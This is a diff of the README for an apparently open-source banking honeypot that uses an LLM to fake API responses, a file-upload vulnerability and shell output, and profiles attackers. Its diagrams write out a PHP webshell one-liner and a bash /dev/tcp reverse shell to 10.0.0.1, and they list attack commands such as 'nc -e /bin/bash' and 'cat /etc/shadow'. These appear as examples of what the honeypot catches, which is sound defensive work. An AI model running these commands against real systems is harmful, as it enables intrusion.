@@ -1,124 +1,205 @@
-# Maze Myth
+# Maze Myth — Dynamic Banking Honeypot
 
-**A dynamic API honeypot that generates deception paths to keep attackers trapped in an ever-changing maze.**
-
-> _A Dynamic API Deception Maze that traps attackers psychologically._
+> **A real-time deception platform that traps attackers in an AI-powered banking maze, analyzes their behavior, and never lets them know they're caught.**
 
 ---
 
 ## 🔥 The Problem
 
-Traditional honeypots are **easily fingerprinted** and abandoned:
+Traditional honeypots are **easily fingerprinted**:
+- Static endpoints → trivially detected
+- Predictable responses → reveal fakeness in seconds
+- No file upload or webshell simulation
+- Zero attacker behavior profiling
 
-- **Static endpoints** are trivial to detect
-- **Predictable responses** reveal they're fake
-- **Limited interaction** makes attackers suspicious
-- **Same data** for every attacker
-
-**Result**: You capture 10 seconds of reconnaissance before they disappear.
+**Result**: You capture 10 seconds of recon before they disappear.
 
 ---
 
 ## 🧠 The Solution
 
-**Maze Myth** introduces a **dynamic deception maze** where:
-1. **Every Request Yields New Data**: No two API calls return the same data. IDs, balances, and names are randomized on the fly.
-2. **Infinite Depth**: The maze never ends. New endpoints and files are generated on demand.
-3. **Psychological Entrapment**: Breadcrumbs and "success" signals keep attackers engaged for hours.
+**Maze Myth** combines three deception layers:
 
-### Core Concept
+| Layer | What it does |
+|-------|-------------|
+| **Dynamic API Maze** | Infinite AI-generated endpoints — every attacker sees different data |
+| **CVE-2020-36179 Trap** | Fake file upload RCE — accepts webshells, simulates execution with AI responses |
+| **Attacker Intelligence** | Profiles every attacker: geo, phase, risk scores, and deception advice |
 
-```
-Attacker discovers /api/v1/login
-    ↓
-Success! Gets token → /api/v1/users appears
-    ↓
-More endpoints emerge → /api/v2/admin/secrets
-    ↓
-"Secrets" file downloads → Opens PDF/DB with beacon
-    ↓
-Beacon fires → We track their exact location
-    ↓
-Still exploring... forever trapped in the maze
-```
 ---
 
-## How a Request Flows Through the System
+## 🗺️ How the Attack Flow Works
 
-```
-Attacker hits any URL
-        │
-        ▼
-honeypot.py receives it
-        │
-        ├─→ Fixed route? (e.g. /api/v1/accounts)
-        │       └─→ BankingDataGenerator generates fresh data
-        │               └─→ Return JSON response
-        │
-        └─→ Dynamic catch-all (unknown path)
-                │
-                ├─→ maze_generator validates path & assigns access level
-                │
-                ├─→ LLMGenerator calls Gemini API with path context
-                │       └─→ Returns realistic JSON
-                │
-                ├─→ 20% chance: FileGenerator creates a bait file
-                │       └─→ Beacon ID saved to SQLite beacons table
-                │
-                ├─→ Response saved to SQLite endpoints table
-                │       (same URL → same AI response forever)
-                │
-                └─→ Return JSON + optional _attachments download link
+### Layer 1 — API Maze (Always Active)
+
+```mermaid
+flowchart TD
+    A["🌐 Attacker hits any URL"] --> B{Fixed route?}
+    B -- Yes --> C["BankingDataGenerator\nreturns fresh JSON"]
+    B -- No --> D["Dynamic catch-all:\nmaze_generator validates path"]
+    D --> E["Gemini LLM generates\nrealistic API response"]
+    E --> F{20% chance}
+    F -- Yes --> G["FileGenerator creates\nbait file + beacon ID"]
+    F -- No --> H["Return JSON response\n+ breadcrumb hints"]
+    G --> H
+    H --> I["Response saved to SQLite\n(same URL → same AI response)"]
+    I --> J["Attacker downloads file\n→ CRITICAL alert fired"]
+    J --> K["Attacker opens file\n→ Beacon fires → location tracked"]
+    K --> L["🔁 Maze continues forever..."]
 ```
 
 ---
 
-## ✅ Upgrade Status
+### Layer 2 — CVE-2020-36179 File Upload Trap
 
-| # | Upgrade | Status |
-|---|---|---|
-| 1 | Containerize + Docker Compose (Gunicorn) | ✅ Done |
-| 2 | Replace TinyDB with SQLite (WAL mode) | ✅ Done |
-| 3 | LLM Offline Fallback (Ollama) | 🔜 Planned |
-| 4 | Full Config System (`config.yaml`) | 🔜 Planned |
-| 5 | IP Reputation Scoring | 🔜 Planned |
-| 6 | Firewall Export + Auto-Ban | 🔜 Planned |
-| 7 | Tarpit Mode | 🔜 Planned |
-| 8 | Webhook + SIEM Alerts | 🔜 Planned |
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant H as Honeypot
+    participant RAG as Shell RAG Engine
+    participant G as Gemini LLM
+    participant I as Intel Engine
 
-> See [DEPLOYMENT.md](DEPLOYMENT.md) for deployment instructions.
+    A->>H: GET /clientportal/support/attachments.php
+    H->>I: record_form_view(ip)
+    H-->>A: Realistic PHP upload form (fake Apache headers)
+
+    A->>H: POST /clientportal/support/attachments.php<br/>file=shell.php (<?php system($_GET['cmd']); ?>)
+    H->>I: record_upload(ip, file, bytes)
+    Note over H: Detects webshell patterns<br/>Registers filename in _shell_registry<br/>File NEVER written to disk
+    H-->>A: Upload success + /uploads/shell.php URL
+
+    A->>H: GET /uploads/shell.php?cmd=whoami
+    H->>I: record_webshell_access(ip, cmd)
+    H->>RAG: resolve_shell_command("whoami")
+    Note over RAG: 1. Exact cache (ground-truth)<br/>2. Case-insensitive match<br/>3. Dynamic handler<br/>4. TF-IDF fuzzy (Cowrie dataset)<br/>5. Gemini LLM (cached per session)<br/>6. bash error fallback
+    RAG-->>H: "www-data"
+    H-->>A: www-data
+
+    A->>H: GET /uploads/shell.php?cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+    H->>I: record_webshell_access(ip, revshell_cmd)
+    Note over H: Simulates hang (1.5s delay, empty response)<br/>Fully logged as POST_EXPLOIT phase
+    H-->>A: (empty — simulated timeout)
+
+    A->>H: GET /api/dashboard/cve/file-upload/attacker/10.0.0.1
+    Note over H: Returns full attacker profile:<br/>geo, phase, risk scores, deception advice
+```
+
+---
+
+### Layer 3 — Attacker Intelligence Engine
+
+```mermaid
+flowchart LR
+    subgraph Events["📡 Recorded Events"]
+        E1["Form View"]
+        E2["File Upload\n(safe/dangerous/webshell)"]
+        E3["?cmd= execution\n(risk scored 0-100)"]
+    end
+
+    subgraph Session["🧠 AttackerSession"]
+        S1["IP Geolocation\n(country, ISP, VPN?)"]
+        S2["Attack Phase\nIDLE→RECON→EXPLOIT→POST_EXPLOIT→LATERAL"]
+        S3["Engagement Score\n0-100"]
+        S4["File Analysis\n(18 pattern tags)"]
+        S5["Command Timeline\n(risk-sorted)"]
+    end
+
+    subgraph Output["📊 Dashboard Output"]
+        D1["Global Stats"]
+        D2["Top Attackers by Engagement"]
+        D3["Phase Distribution"]
+        D4["Deception Advisor\n(how to keep attacker longer)"]
+        D5["Per-IP Deep Profile"]
+    end
+
+    Events --> Session
+    Session --> Output
+```
+
+---
+
+### Attack Phase Classification
+
+```mermaid
+stateDiagram-v2
+    [*] --> IDLE : Attacker connects
+    IDLE --> RECON : whoami / id / ls / uname
+    RECON --> EXPLOIT : cat /etc/shadow / sudo -l / SUID hunt
+    EXPLOIT --> POST_EXPLOIT : reverse shell attempt (nc/bash/python)
+    POST_EXPLOIT --> LATERAL : SSH lateral / cron persistence / exfil
+    LATERAL --> [*]
+
+    note right of RECON
+        Risk: 15-35
+        Commands: whoami, id, hostname,
+        ps aux, ifconfig, env, history
+    end note
+
+    note right of EXPLOIT
+        Risk: 45-80
+        Commands: sudo -l, cat /etc/shadow,
+        useradd, curl/wget, chmod 4755
+    end note
+
+    note right of POST_EXPLOIT
+        Risk: 85-95
+        Commands: bash -i >& /dev/tcp/
+        nc -e /bin/bash, python3 -c socket.connect
+    end note
+```
+
+---
+
+## ✅ Feature Status
+
+| # | Feature | Status |
+|---|---------|--------|
+| 1 | Docker + Gunicorn containerization | ✅ Done |
+| 2 | SQLite state (WAL mode) | ✅ Done |
+| 3 | AI-generated banking API responses & files (Gemini) | ✅ Done |
+| 4 | Multi-format tracked bait files + beacons | ✅ Done |
+| 5 | CVE-2020-36179 File Upload RCE deception | ✅ Done |
+| 6 | Hybrid Shell RAG Engine (Cowrie + Gemini) | ✅ Done |
+| 7 | Attacker Intelligence & Behavior Profiling | ✅ Done |
+| 8 | LLM Offline Fallback (Ollama) | 🔜 Planned |
+| 9 | Webhook + SIEM Alerts | 🔜 Planned |
+| 10 | Tarpit Mode | 🔜 Planned |
 
 ---
 
 ## 🚀 Key Features
 
-### 1. Dynamic Data Generator
-Generates fresh, realistic banking data for every request:
-- **Companies**: 8–20 random companies per call
-- **Accounts**: 15–40 accounts with realistic balances ($10k–$50M)
-- **Transactions**: 20–100 unique transactions per account
-- **Payments**: Wire, ACH, SWIFT payments with status tracking
-- **Users**: Admin, finance, and report users
+### 1. Dynamic API Maze
+Every attacker sees different data. Infinite endpoint generation:
+- **Companies**: 8–20 per call | **Accounts**: 15–40 | **Transactions**: 20–100
+- Gemini LLM generates realistic JSON for unknown paths
+- Same URL always returns the same AI response (consistency)
 
-### 2. Multi-Format Bait Files
-Tracked files in **10+ formats**, each with embedded beacons:
-- **PDF**: Financial reports, statements
-- **Excel (.xlsx)**: Transaction spreadsheets
-- **Database (.db, .sqlite)**: Full SQLite databases with tables
-- **CSV**: Data exports, XML, JSON credentials, JavaScript configs, SQL schema dumps
+### 2. CVE-2020-36179 File Upload Trap
+Simulates a vulnerable banking document upload portal:
+- **Two realistic endpoints**: Spring (Java compliance portal) + PHP (client support)
+- **Only real webshell payloads** trigger the execution trap
+- **Fake webshell execution**: AI generates realistic shell output
+- **No files ever written to disk**
 
-### 3. AI-Powered Responses
-Integration with **Google Gemini 2.0 Flash**:
-- Generates context-aware JSON responses
-- Simulates realistic error messages
-- Adapts to attacker inputs
+### 3. Hybrid Shell RAG Engine
+Generates reverse shell responses using Cowrie honeypot dataset + Gemini:
+- **58 ground-truth** commands (always correct, www-data identity)
+- **TF-IDF fuzzy matching** on 235 real Cowrie attacker sessions
+- **Gemini LLM fallback** for novel commands (cached per session)
+- Consistent responses — only changes on server restart
 
-### 4. Real-Time Dashboard
-Monitor the attack as it happens on `http://localhost:8002`:
-- **Live Feed**: See every endpoint hit
-- **Download Tracking**: Watch attackers steal files
-- **Beacon Alerts**: Know exactly when a file is opened
-- **Sensitive Data Alerts**: Critical warnings for admin/secret access
+### 4. Attacker Intelligence Dashboard
+
+```
+GET /api/dashboard/cve/file-upload           → Full intel summary
+GET /api/dashboard/cve/file-upload/attackers → All attacker profiles
+GET /api/dashboard/cve/file-upload/attacker/<ip> → Deep per-IP profile
+```
+
+### 5. Multi-Format Bait Files
+`.pdf`, `.xlsx`, `.csv`, `.xml`, `.json`, `.js`, `.db`, `.sqlite`, `.txt` — all with embedded beacon tracking.
 
 ---
 
@@ -126,131 +207,103 @@ Monitor the attack as it happens on `http://localhost:8002`:
 
 ```
 Maze-Myth-Dynamic-Honeypot/
-├── honeypot.py               # Main Flask application
-├── requirements.txt          # Python dependencies
-├── run_honeypot.bat          # Windows: start everything locally
-├── setup_honeypot.py         # Initial directory setup
-├── DEPLOYMENT.md             # Docker / production guide
 │
-├── docker/                   # Container files (Upgrade 1)
-│   ├── Dockerfile            # Multi-stage build (honeypot + dashboard targets)
-│   ├── docker-compose.yaml   # One-command production launch
-│   └── .dockerignore
+├── honeypot.py               ← Main Flask application (all routes)
+├── run_honeypot.bat          ← Windows: double-click to start
 │
-├── .github/workflows/
-│   └── docker-publish.yml    # CI: auto-build & push to GHCR
+├── src/
+│   ├── file_upload_rce.py    ← CVE-2020-36179 deception module
+│   ├── attacker_intel.py     ← Behavior analysis & profiling engine 
+│   ├── api_generator/        ← Maze routing & access control
+│   ├── data_generator/       ← Fake banking data generation
+│   ├── file_generator/       ← Tracked bait files with beacons
+│   ├── llm/                  ← Gemini API integration
+│   ├── rag/
+│   │   ├── rag_loader.py     ← Banking domain context
+│   │   ├── shell_rag_loader.py ← Shell command RAG engine 
+│   │   └── shell_rag.pkl     ← Trained Cowrie model
+│   └── state/                ← SQLite persistence (WAL)
 │
-├── src/                      # Core Modules
-│   ├── api_generator/        # API maze and routing logic
-│   ├── data_generator/       # Dynamic banking data generation
-│   ├── file_generator/       # Tracked bait file creation
-│   ├── llm/                  # Gemini AI integration
-│   ├── rag/                  # RAG context loader
-│   └── state/                # State persistence
+├── dashboard/                ← Operator monitoring UI
+│   ├── index.html            ← Dashboard UI (port 8002)
+│   └── monitor.py            ← Dashboard Flask backend
 │
-├── dashboard/                # Monitoring System
-│   ├── index.html            # Dashboard UI
-│   └── monitor.py            # Dashboard Flask backend (port 8002)
-│
-├── databases/                # Runtime state storage
-├── generated_files/          # Generated bait files
-└── log_files/                # Encoded audit logs
+└── Dataset/                  ← Training data
+    ├── shell_rag.pkl         ← Cowrie-trained command model
+    └── ai_cmd_cache.json     ← Gemini-generated command cache
+
 ```
 
 ---
 
 ## 🚀 Quick Start
 
-### Option A — Docker (Recommended, production-ready)
-
-Requires [Docker Desktop](https://docs.docker.com/get-docker/).
+### Option A — Docker (Production)
 
 ```bash
-# 1. Clone
 git clone https://github.com/Mark-Meka/Maze-Myth-Dynamic-Honeypot.git
 cd Maze-Myth-Dynamic-Honeypot
-
-# 2. Set your API key
 cp .env.template .env
-# Edit .env and add: GEMINI_API_KEY=your_key_here
-
-# 3. Build and start both services
-docker compose -f docker/docker-compose.yaml build
+# Edit .env: add GEMINI_API_KEY=your_key_here
 docker compose -f docker/docker-compose.yaml up -d
 ```
 
-| Service | URL |
-|---|---|
-| 🎯 Honeypot API | http://localhost:8001 |
-| 📊 Monitoring Dashboard | http://localhost:8002 |
-
-```bash
-# View live logs
-docker compose -f docker/docker-compose.yaml logs -f
-
-# Stop
-docker compose -f docker/docker-compose.yaml down
-```
-
----
-
-### Option B — Local Python (Windows, development)
-
-Use **`run_honeypot.bat`** — it handles everything automatically:
+### Option B — Windows Local
 
 ```
 Double-click run_honeypot.bat
 ```
 
-Or from a terminal:
+### Option C — Windows/Linux Manual Setup
 
-```cmd
-run_honeypot.bat
-```
+1. **Install Python requirements**:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-The script will:
-1. Check Python is installed
-2. Create and activate the virtual environment
-3. Install all dependencies if missing
-4. Start the **honeypot** on `http://localhost:8001`
-5. Open a second window for the **dashboard** on `http://localhost:8002`
+2. **Configure Gemini Artificial Intelligence**:
+   The honeypot uses a Google Gemini LLM API key to dynamically generate hyper-realistic HTTP responses, CSV, SQLite schema, JSON baits, and reverse shell commands.
+   ```bash
+   # Copy the template variables
+   cp .env.template .env
+   
+   # Open .env in your text editor and paste your API key:
+   # GEMINI_API_KEY="AIzaSy...your-gemini-key-here..."
+   ```
 
----
+3. **Start the applications**:
+   ```bash
+   # Terminal 1 (The Honeypot Catching Attackers)
+   python honeypot.py
+   
+   # Terminal 2 (The Intelligence Dashboard for Operators)
+   python dashboard/monitor.py
+   ```
 
-### Option C — Manual (any OS)
-
-```bash
-# Clone and install
-git clone https://github.com/Mark-Meka/Maze-Myth-Dynamic-Honeypot.git
-cd Maze-Myth-Dynamic-Honeypot
-pip install -r requirements.txt
-
-# Configure
-cp .env.template .env
-# Edit .env: add GEMINI_API_KEY=your_key_here
-
-# Terminal 1 — Honeypot
-python honeypot.py
-
-# Terminal 2 — Dashboard
-python dashboard/monitor.py
-```
+| Service      | URL                                                 | Audience                |
+| ------------ | --------------------------------------------------- | ----------------------- |
+| 🎯 Honeypot  | http://localhost:8001                               | Attackers (expose this) |
+| 📊 Dashboard | http://localhost:8002                               | Operators only          |
+| 🔍 Intel API | http://localhost:8001/api/dashboard/cve/file-upload | Operators only          |
 
 ---
 
-## 🎭 Attack Scenario
+## 🎭 Full Attack Scenario
 
-1. **Discovery** — Attacker scans and finds `/api/v1/auth/login`. Tries `admin:admin`. Gets a JWT token and breadcrumb to `/api/v1/users`.
-2. **Exploration** — Lists users. Gets 12 realistic randomized users. Hint at `/api/v2/admin`.
-3. **Escalation** — Hits `/api/v2/admin/secrets`. Returns `encryption_keys.json`, `master_api_key.txt`.
-4. **Exfiltration** — Downloads `master_api_key.txt`. A CRITICAL event fires. Dashboard flashes alert. File has embedded tracking beacon.
-5. **Consumption** — Attacker opens the file. Beacon fires. They're tracked — and the maze continues forever.
+1. **Discovery** — Attacker finds `/api/v1/auth/login`. Gets JWT + hint to `/api/v1/users`
+2. **Exploration** — Lists users, accounts, transactions. Finds `/api/v2/admin/secrets`
+3. **File Theft** — Downloads `encryption_keys.json` → beacon fires → attacker tracked
+4. **Upload Exploit** — Finds `/clientportal/support/attachments.php`, uploads `shell.php`
+5. **Webshell** — Runs `whoami`, `cat /etc/passwd`, `env` — all answered by AI
+6. **Reverse Shell** — Tries `bash -i >& /dev/tcp/...` → simulated hang
+7. **Dashboard** — Operator sees full profile: country, ISP, phase=POST_EXPLOIT, risk=95, deception advice
 
 ---
 
 ## 🔒 Security Warning
 
-> ⚠️ This is a deception tool. Run in an isolated environment (VM/container/VLAN). Do not expose the dashboard port (8002) publicly — it is for operators only. Use an SSH tunnel to view it remotely.
+> ⚠️ This is a deception tool. Run in an **isolated environment** (VM/container/VLAN).  
+> **Never expose port 8002** — it is for operators only. Use SSH tunneling to view remotely.
 
 ---
 
@@ -258,9 +311,6 @@ python dashboard/monitor.py
 
 MIT License — See [LICENSE](LICENSE)
 
----
-
 ## 📞 Contact
 
-- **Author**: Mark Meka
-- **GitHub**: [@Mark-Meka](https://github.com/Mark-Meka)
+- **Author**: Mark Meka | **GitHub**: [@Mark-Meka](https://github.com/Mark-Meka)
